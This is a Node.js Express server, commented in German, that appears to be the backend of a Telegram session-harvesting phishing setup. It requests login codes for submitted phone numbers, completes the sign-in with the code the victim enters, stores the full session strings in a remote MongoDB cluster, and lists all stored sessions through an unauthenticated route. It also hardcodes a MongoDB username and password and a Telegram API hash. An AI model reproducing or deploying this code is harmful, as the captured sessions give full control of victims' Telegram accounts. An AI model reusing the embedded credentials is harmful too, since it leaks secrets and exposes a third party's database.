const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// 1. MONGODB Verbindung (Setz hier deinen Connection String ein!)
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const SessionModel = mongoose.model('Session', SessionSchema);

// 2. Telegram Konfig
const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
let client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
let phoneCodeHash = '';

// 3. Routen
app.post('/send-otp', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        phoneCodeHash = result.phoneCodeHash;
        res.json({ success: true });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phoneNumber, code } = req.body;
        await client.signIn({ apiId, apiHash, phoneNumber, phoneCodeHash, phoneCode: code });
        const sessionString = client.session.save();
        
        // Speichere in MongoDB
        await SessionModel.create({ phone: phoneNumber, session: sessionString });
        
        res.json({ success: true, session: sessionString });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

// NEU: Diese Route hat dir gefehlt (404-Fix)
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await SessionModel.find();
        res.json(sessions);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf ${PORT}`));
